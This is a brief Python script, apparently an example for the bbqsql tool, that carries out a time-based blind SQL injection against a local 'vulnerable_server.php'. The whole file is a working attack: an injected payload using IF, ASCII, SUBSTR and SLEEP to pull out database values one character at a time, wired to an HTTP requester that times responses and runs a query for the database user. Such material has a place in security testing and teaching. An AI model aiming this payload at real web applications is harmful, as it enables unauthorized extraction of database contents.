import bbqsql
from urllib import quote


url = bbqsql.Query('http://127.0.0.1/vulnerable_server.php?query=${query}',encoder=quote)
query = bbqsql.Query("hello' or if(ascii(substr((${user_query:SELECT 'A'} LIMIT 1 OFFSET ${row_index:0}), ${char_index:1}, 1))${comparator:=}${char_val:65},sleep(${sleep:1}),1)=0 or 'a'='b")

#build a bbqsql.Requester object 
requester = bbqsql.HTTPRequester(url = url , response_cmp_attribute = "response_time")

tech = bbqsql.BlindTechnique(make_request_func=requester.make_request,query=query,concurrency=1)
results = tech.run('SELECT user() from example',sleep=1)

print results
